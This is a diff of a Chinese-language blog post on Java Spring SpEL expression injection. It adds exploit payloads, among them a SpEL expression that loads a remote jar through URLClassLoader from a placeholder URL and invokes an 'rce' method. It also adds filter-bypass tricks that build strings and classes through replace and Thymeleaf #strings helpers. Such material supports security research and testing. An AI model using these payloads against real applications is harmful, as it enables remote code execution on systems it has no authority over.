@@ -88,7 +88,7 @@
             <h1>Java spring SPEL表达式注入</h1>
             <span class="meta">
             	Posted on
-              2020-09-07，4 min read
+              2020-09-07，5 min read
             </span>
           </div>
         </div>
@@ -202,9 +202,27 @@ uest.getHeader(222),#this.getClass().getClassLoader().loadClass(#request.getHead
 #this.getClass().getClassLoader().loadClass(#request.getHeader(111)).getDeclaredMethod(#reques
 t.getHeader(444)).invoke(null),#request.getParameter(1))}]]
 </code></pre>
-<p>其他bypass的。可以看<br>
+<p>利用Urlclassload。来创建类。然后new</p>
+<pre><code>New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL(&quot;http://xxxx/xxx.jar&quot;}).getDeclaredMethod(&quot;rce&quot;).invoke(null)
+</code></pre>
+<h2 id="其他bypass的-可以看httpswwwmi1k7eacom20200110spele8a1a8e8bebee5bc8fe6b3a8e585a5e6bc8fe6b49ee680bbe7bb93先占个坑">其他bypass的。可以看<br>
 <code>https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</code><br>
-先占个坑。</p>
+先占个坑。</h2>
+<p>填坑：</p>
+<p>根据replace传byte。可以获取字符串</p>
+<pre><code>#servletContext.getServerInfo()[0].replace(65,10+#servletContext.getServerInfo()[0].replace(65,104)
+</code></pre>
+<p>获取string class</p>
+<pre><code>#strings.arraySplit(&quot;a,a&quot;,&quot;,&quot;).getClass()
+</code></pre>
+<p>获取string<code>[]</code></p>
+<pre><code>#strings.arraySplit(&quot;a,a&quot;,&quot;,&quot;)
+</code></pre>
+<p>获取各种类型</p>
+<pre><code>${#strings.arraySplit(namesStr,',')}                // returns String[]
+${#strings.listSplit(namesStr,',')}                 // returns List&lt;String&gt;
+${#strings.setSplit(namesStr,',')}                  // returns Set&lt;String&gt;
+</code></pre>
 
           
           <p class="next-post">下一篇：
